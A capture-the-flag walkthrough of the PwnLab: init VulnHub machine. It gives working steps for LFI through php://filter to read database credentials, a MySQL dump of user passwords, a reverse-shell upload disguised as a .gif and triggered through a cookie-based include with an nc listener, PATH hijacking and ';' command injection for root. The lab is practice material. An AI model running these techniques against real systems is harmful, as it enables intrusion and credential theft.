**Target: 10.0.0.37**  
**Difficulty: Medium**  
**Source: https://www.vulnhub.com/entry/pwnlab-init,158/**  

## ***NMAP***

	$ nmap -sS -T4 -p- 10.0.0.37

	PORT      STATE SERVICE
	80/tcp    open  http
	111/tcp   open  rpcbind
	3306/tcp  open  mysql
	56784/tcp open  unknown

A NMAP scan shows 2 interesting ports. 'rpcbind' and port 53241 don't come into affect.
Let's start enumerating HTTP and try to get credentials to log into the 'mysql' database.


## ***HTTP*** 

![image](https://user-images.githubusercontent.com/76552238/159150489-e4fc02c6-d367-4c28-921b-e389ed8c6b25.png)

	$ gobuster dir -u http://10.0.0.37/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php, txt

	/images               (Status: 301) [Size: 307] [--> http://10.0.0.37/images/]
	/index.php            (Status: 200) [Size: 332]                               
	/upload               (Status: 301) [Size: 307] [--> http://10.0.0.37/upload/]
	/upload.php           (Status: 200) [Size: 19]                                
	/login.php            (Status: 200) [Size: 250]                               
	/config.php           (Status: 200) [Size: 0] 

Going to **http://10.0.0.37** there are 3 hyperlinks, Home, Login and Upload. Going to the Login page, it seems it might be vulnerable to LFI (Local File Inclusion).

![image](https://user-images.githubusercontent.com/76552238/159150551-5b315e1e-89c9-4011-8957-524a6da3ca49.png)

I tried accessing the /etc/passwd file but nothing showed up.

http://10.0.0.37/?page=../../../../etc/passwd

Now at this point I got stuck. I tried finding other ways to perform a LFI but found nothing. A write up I found pointed to this site ---> **https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/**

The article suggests to use the '**php://filter**' wrapper and base64 encode the content of the file we enter in the resource.

PHP provides a number of I/O streams that allow access to PHP's own input and output streams and filters that can manipulate other file resources as they are read from and written to. 'php://filter' is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. 'php://filter/convert.base64-encode/resource=' forces PHP to base64 encode the file before it is used in the require statement.

We can now try to read the config.php file we were not permitted to.
For some reason entering "config.php" as the resource name doesn't return any content, but "config" does.

![image](https://user-images.githubusercontent.com/76552238/159150628-ea871740-b6e7-4f0f-b06f-fc77236135b4.png)

<!--http://10.0.0.37/?page=php://filter/convert.base64-encode/resource=config-->

From this point it's a matter of decoding the Base64 string.

	$ echo 'PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8' | base64 -d

	<?php
	$server   = "localhost";
	$username = "root";
	$password = "H4u%QJ_H99";
	$database = "Users";
	?base64: invalid input


We know have credentials (root:H4u%QJ_H99). We can log into the site hosted on the web server via the 'login.php' page or mysql on port 3306. 

![image](https://user-images.githubusercontent.com/76552238/159150738-beb1c45e-6ef6-4584-8d20-f5b094832af0.png)

![image](https://user-images.githubusercontent.com/76552238/159150740-5e43ffab-8b6e-494b-ad25-e70710692500.png)

'login.php' doesn't work so let's try to log into the SQL database and get more information.

	$ mysql -h 10.0.0.37 -u root -p

	Enter password: H4u%QJ_H99
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 53
	Server version: 5.5.47-0+deb8u1 (Debian)

	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

	MySQL [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| Users              |
	+--------------------+
	2 rows in set (0.000 sec)

	MySQL [(none)]> use Users;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A

	Database changed
	MySQL [Users]> show tables;
	+-----------------+
	| Tables_in_Users |
	+-----------------+
	| users           |
	+-----------------+
	1 row in set (0.000 sec)

	MySQL [Users]> select * from users;
	+------+------------------+
	| user | pass             |
	+------+------------------+
	| kent | Sld6WHVCSkpOeQ== |
	| mike | U0lmZHNURW42SQ== |
	| kane | aVN2NVltMkdSbw== |
	+------+------------------+
	3 rows in set (0.000 sec)

After decoding the base64 encoded passwords we can try to log into the site and try get a reverse shell (since SSH isn't available).

	kent:JWzXuBJJNy
	mike:SIfdsTEn6I
	kane:iSv5Ym2GRo

![image](https://user-images.githubusercontent.com/76552238/159150833-1959824d-faee-4a78-b360-7fb76555b8e1.png)

After logging with the kent user we can actually use the site as it was intended (not really) and upload a file. 

![image](https://user-images.githubusercontent.com/76552238/159150856-e3d44b49-8bfd-4ca5-bb14-87c06c4dcf9f.png)

I tried uploading a reverse shell written in php and this error was prompted.

![image](https://user-images.githubusercontent.com/76552238/159150866-b1ba31f0-b24b-42f4-96d5-67a78e76e4a5.png)

Changing the file name from "**php-reverse-shell.php**" to "**php-reverse-shell.php.gif**" allows us to upload it. 

![image](https://user-images.githubusercontent.com/76552238/159150908-4e27e08c-7699-4011-b030-f1dcd4989c2a.png)

It is stored a the directory '/upload' and is hashed.

![image](https://user-images.githubusercontent.com/76552238/159150920-01684c34-c681-4f2d-9154-a9b4613c5081.png)

Going to **http://10.0.0.37/upload/450619c0f9b99fca3f46d28787bc55c5.gif**, we get an error.

![image](https://user-images.githubusercontent.com/76552238/159150974-aa638397-6e88-41e7-842c-02376c570f02.png)

Using the LFI we found earlier we can read other pages on the web server.

![image](https://user-images.githubusercontent.com/76552238/159151030-c43bfd46-8597-4208-9fbd-b43a2e9bc727.png)

 After reading the 'index.php' page we find something interesting.

> ### ***index.php source code:***

	<?php
	//Multilingual. Not implemented yet.
	//setcookie("lang","en.lang.php");
	if (isset($_COOKIE['lang']))
	{
		include("lang/".$_COOKIE['lang']);
	}
	// Not implemented yet.
	?>
	<html>
	<head>
	<title>PwnLab Intranet Image Hosting</title>
	</head>
	<body>
	<center>
	<img src="images/pwnlab.png"><br />
	[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
	<hr/><br/>
	<?php
		if (isset($_GET['page']))
		{
			include($_GET['page'].".php");
		}
		else
		{
			echo "Use this server to upload and share image files inside the intranet";
		}
	?>
	</center>
	</body>
	</html>


Using Burp Suite we can access the cookie "lang" that was mentioned in the 'index.php' script above and use it for another LFI to access the reverse shell script we uploaded.

### ***Remote Machine:***

![image](https://user-images.githubusercontent.com/76552238/159151788-4b49202a-8b97-4f0c-af95-61c46c33902b.png)

### ***Local Machine:***

	$ nc -lvp 4444

![image](https://user-images.githubusercontent.com/76552238/159151821-d7eebd3c-e587-470c-83e9-205db40fe0dc.png)

## ***PRIVILEGE ESCALATION***

Going to the directory '/home' there are 4 users:

	drwxr-x--- 2 john john 4096 Mar 17  2016 john
	drwxr-x--- 2 kane kane 4096 Mar  1 17:03 kane
	drwxr-x--- 2 kent kent 4096 Mar 17  2016 kent
	drwxr-x--- 2 mike mike 4096 Mar 17  2016 mike

Let's if the credentials we found from the SQL database for the users in the site are the same here.  

We are able to log into the user 'kent' but his folder doesn't hold anything interesting. The password we found for the user 'mike' doesn't work. Luckily the password for the user 'kane' is correct.

	$ su kane

![image](https://user-images.githubusercontent.com/76552238/159152016-2d98ed20-04b2-48b8-a196-83ca5d47bbd4.png)

![image](https://user-images.githubusercontent.com/76552238/159152103-5960d45c-3070-483b-9dd4-0ca2ae16a36b.png)

After logging in as the user 'kane' and going to /home/kane, we can see that there is an executable called "msgmike". 

	$ ./msgmike

![image](https://user-images.githubusercontent.com/76552238/159152142-f1c4cf8a-e722-4fb7-adfd-a9504a6afb63.png)

It looks like we can exploit the PATH variable and add our own file named 'cat'.

	$ echo '/bin/bash' > /tmp/cat
	$ export PATH=/home/kane
	$ ./msgmike

![image](https://user-images.githubusercontent.com/76552238/159152457-8aa5da81-e29f-438f-bb3c-ea4fc50014f3.png)


NICE! We are successfully logged in as the user 'mike'.  
Going to the directory '/home/mike' we find another executable "msg2root".

![image](https://user-images.githubusercontent.com/76552238/159152479-68eb3f93-5c5b-471c-a51f-d0b0c469033d.png)

Let's look for any hidden strings in the executable.

	$ strings msg2root

![image](https://user-images.githubusercontent.com/76552238/159152499-b24f2154-79ae-4949-8375-3c02b3969c5d.png)

Looks like we to inject code using ';'.

	$ ./msg2root
![image](https://user-images.githubusercontent.com/76552238/159152549-86786779-65b3-4bd2-8902-aba69ca912be.png)

Now that we have a root shell we can read the flag.

	# cat /root/flag.txt

![image](https://user-images.githubusercontent.com/76552238/159152578-d56a3374-46fc-491d-8fca-835314e206ba.png)
